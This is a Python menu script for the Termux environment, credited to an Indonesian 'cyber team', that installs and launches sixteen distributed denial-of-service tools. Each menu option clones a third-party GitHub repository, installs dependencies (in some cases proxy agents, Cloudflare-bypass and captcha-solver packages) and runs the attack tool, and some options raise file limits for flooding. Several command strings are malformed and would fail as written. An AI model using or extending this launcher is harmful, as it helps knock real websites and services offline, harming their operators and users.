# Module
from os import system 
from time import sleep 

# Program
def logo():
	print("""
\33[5;31m██████╗ ██████╗  ██████╗ ███████╗   ████████╗ ██████╗  ██████╗ ██╗\33[5;31m
\33[5;31m██╔══██╗██╔══██╗██╔═══██╗██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║\33[5;31m
\33[5;31m██║  ██║██║  ██║██║   ██║███████╗█████╗██║   ██║   ██║██║   ██║██║\33[5;31m
\33[5;37m██║  ██║██║  ██║██║   ██║╚════██║╚════╝██║   ██║   ██║██║   ██║██║\33[5;37m
\33[5;37m██████╔╝██████╔╝╚██████╔╝███████║      ██║   ╚██████╔╝╚██████╔╝███████╗ \33[5;37m
\33[5;37m╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ \33[5;37m
                                                                                       """)
	print("""
\33[5;31m|--------------------------------------------------------|\33[5;31m
\33[5;31m||-[+] Author  : Mr.Zeth                      ||||||||||||\33[5;31m
\33[5;31m||-[+] Team    : NTB CYBER TEAM               ||||||||||||\33[5;31m
\33[5;37m||-[+] Github  : https://github.com/ZeThAlOnE ||||||||||||\33[5;37m
\33[5;37m||-[+] Telegram: https://t.me/Ntb_Cyber_Team  ||||||||||||\33[5;37m
\33[5;37m|--------------------------------------------------------|\33[5;37m
""")

logo()

def menu():
	print("""
		[1]--Hammer------[]
		[2]--Torshammer--[]
		[3]--LiteDDOS----[]
		[4]--DDOserV2----[]
		[5]--Lucita_DDOS-[]
		[6]--DDOS--------[]
		[7]--B-ATTACKING-[]
		[8]--brownc2-----[]
		[9]--NaSaKi-V4---[]
		[10]-ZxCDDoS-----[]
		[11]-Stanley-----[]
		[12]-KARMA-DDOS--[]
		[13]-hulk--------[]
		[14]-ECC-DDoS----[]
		[15]-spurt-------[]
		[16]-HASOKI------[]
		[00]-Help--------[]
		\33[5;31m """)

	pil = input("-----Masukkan-Pilihan-Anda-: ")
	if pil =="1":
		sleep(1)
		system(""" 
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/cyweb/hammer
cd hammer
python2 hammer.py """)
	
	if pil =="2":
		sleep(1)
		system("""
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/dotfighter/torshammer.git
ls
cd torshammer
python2 torshammer.py """)

	if pil =="3":
		sleep(1)
		system("""
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
python2 liteDDOS.py """)

	if pil =="4":
		sleep(1)
		system("""
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/PanocTeam25/DDoserv2.git
cd DDoserv2
ls
chmod +x *
python2 Noname-DDoSv2.py
python3 Noname-DDoSv2.py """)

	if pil =="5":
		sleep(1)
		system("""
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/zlucifer/lucita_ddos
cd lucita_ddos
ls
python pukul.py """)

	if pil =="6":
		sleep(1)
		system("""
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/pembriahmad/DDOS
cd DDOS
python2 ddos.py """)

	if pil =="7":
		sleep(1)
		system("""
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/BlackCyberAnonim/B-ATTACKING
cd B-ATTACKING
ls
sh install.sh """)

	if pil =="8":
		sleep(1)
		system("""
git clone https://github.com/rude1882/brownc2
cd brownc2
chmod +x *
python3 installer.py
python3 brownc2.py """)

	if pil=="9":
		sleep(1)
		system(""""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/tdd2003/NaSaKi-V4
cd NaSaKi-V4
npm i requests
npm i https-proxy-agent
npm i crypto-random-string
npm i events
npm i fs
npm i net
npm i cloudscraper
npm i request
npm i hcaptcha-solver
npm i randomstring
npm i cluster
npm i cloudflare-bypasser 
python3 setup.py install
python3 main.py""")


	if pil =="10":
		sleep(1)
		system("""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/hoaan1995/ZxCDDoS
cd ZxCDDoS
npm i requests
npm i https-proxy-agent
npm i crypto-random-string
npm i events
npm i fs
npm i net
npm i cloudscraper
npm i request
npm i hcaptcha-solver
npm i randomstring
npm i cluster
npm i cloudflare-bypasser
pip3 install -r requirements.txt
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt-get install ./google-chrome-stable_current_amd64.deb
ulimit -n 999999
chmod 777 *
python3 c2.py """)

	if pil =="11":
		sleep(1)
		system(""""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/weird1337/Stanley.git
cd Stanley
chmod +x *
python3 installer.py
python3 stanley.py """)

	if pil =="12":
		sleep(1)
		system(""""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/HyuklsBack/KARMA-DDoS
cd KARMA-DDoS
chmod +x *
pip install -r requirements.txt
python3 setup.py install
python3 main.py """)

	if pil =="13":
		sleep(1)
		system("""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/grafov/hulk.git
cd hulk
chmod +x *
python2 hulk.py """)

	if pil =="14":
		sleep(1)
		system("""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/Skyzz2/ECC-DDoS
cd ECC-DDoS
python3 main.py """)

	if pil =="15":
		sleep(1)
		system("""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/zer-far/spurt
cd spurt
make """)

	if pil =="16":
		sleep(1)
		system("""
pkg update -y 
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pkg install php -y
pkg install golang -y
pkg install perl -y
pkg install python3-pip -y
pkg install nodejs -y
pkg install npm -y
pkg install git -y
git clone https://github.com/cutipu/HASOKI.git
cd HASOKI
python3 setup.py install
pip install -r requirements.txt
-wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb """)

	if pil =="00":
		sleep(1)
		print("""\33[5;32m
There are several tools that require a Username & Password to chat with me
http://t.me/Z_e_t_H """)

menu ()
